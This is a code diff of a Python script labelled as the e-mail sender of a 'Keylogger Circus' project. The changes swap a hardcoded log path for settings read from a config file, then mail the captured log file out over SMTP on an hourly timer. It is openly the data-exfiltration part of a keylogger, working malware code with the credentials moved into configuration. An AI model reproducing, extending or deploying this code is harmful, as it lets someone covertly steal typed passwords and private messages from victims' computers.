@@ -1,18 +1,28 @@
-#Windows Console
-import win32api
-import win32console
-import win32gui
+#	Python's Email Sender
+#		the e-mail client from Python's Keylogger Circus
+#		- v.1.2
 
+# SMTP and e-mail libraries
 import smtplib
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 
+# Just timing stuff
 import time
-
 hours = 3600
 
+#	Reads configuration file
+from ConfigParser import SafeConfigParser
+parser = SafeConfigParser()
+parser.read('config.ini')
+
+# Sets variables from confi.ini
+dir = parser.get('Setup','directory')
+smtp = parser.get('Email','smtp')
+port = parser.get('Email','port')
+
 def EmailSender():
-	f=open('c:\users\public\output.cfg','rb')
+	f=open(dir,'rb')
 	buffer = MIMEText(f.read())
 	f.close()
 	
@@ -33,10 +43,12 @@ def EmailSender():
 	msg.attach(MIMEText(html,'html'))
 
 	# sender and receiver address
-	address = #'youraddress@yourservice.com'
-	password = #'password'
+	# from config.ni
+	address = parser.get('Email','login')
+	password = parser.get('Email','pass')
 	
-	server = smtplib.SMTP(#'Your_SMTP_Server:PORT')
+	# STMP and port from config file	
+	server = smtplib.SMTP(smtp+':'+port)
 	server.starttls()
 	server.set_debuglevel(1)
 	server.login(address,password)
